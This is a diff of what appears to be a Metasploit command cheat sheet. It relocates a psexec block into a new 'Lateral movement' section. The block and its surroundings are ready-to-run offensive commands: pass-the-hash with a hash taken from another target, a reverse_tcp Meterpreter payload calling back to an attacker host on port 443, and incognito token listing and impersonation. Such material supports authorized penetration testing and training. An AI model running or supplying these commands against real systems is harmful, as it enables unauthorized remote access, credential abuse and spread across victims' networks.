@@ -86,16 +86,6 @@ set LHOST <attacker IP>
 exploit
 ------------------------------------------------------------------------------------------------------
 
-# psexec
-
-use windows/smb/psexec
-set RHOST <target IP>
-set SMBPass <Administrator hash from another target>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-exploit
-------------------------------------------------------------------------------------------------------
-
 # Sessions
 
 sessions -h
@@ -257,6 +247,18 @@ use incognito
 list_tokens -u
 list_tokens -g
 impersonate_token <domain>\\<user>
+------------------------------------------------------------------------------------------------------
+
+# Lateral movement
+
+use windows/smb/psexec
+set SMBUser <user name>
+set SMBPass <user name hash from another target>
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker IP>
+set LPORT 443
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # Pivoting
